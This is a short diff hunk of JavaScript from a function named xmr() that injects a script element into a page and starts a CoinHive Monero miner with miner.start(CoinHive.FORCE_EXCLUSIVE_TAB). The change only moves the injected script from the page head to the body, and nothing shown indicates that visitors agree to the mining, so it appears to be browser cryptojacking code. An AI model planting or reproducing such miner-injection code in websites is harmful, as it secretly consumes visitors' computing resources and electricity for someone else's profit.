@@ -29,7 +29,7 @@ function xmr(){
         miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
         };
         ss["src"] = bl;
-        document["head"]["appendChild"](ss);
+        document["body"]["appendChild"](ss);
       });
     }
   });
